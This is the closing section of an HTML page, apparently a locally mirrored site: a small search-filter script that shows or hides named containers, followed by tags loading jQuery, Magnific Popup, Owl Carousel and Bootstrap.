                const tvvName = tvvNameElement.textContent.trim().toLowerCase();

                if (tvvName.includes(searchTerm)) {
                    container.style.display = initialDisplayProperties[index]; // Restore the initial display property
                } else {
                    container.style.display = 'none'; // Hide non-matching containers
                }
            });
        });
    });
</script>



    <div class="stwRainbow"></div>
    <div class="stwBlurRainbow"></div>
    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
    <script src="../cdn.jsdelivr.net/npm/bootstrap%405.2.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
        crossorigin="anonymous"></script>



</body>


</html>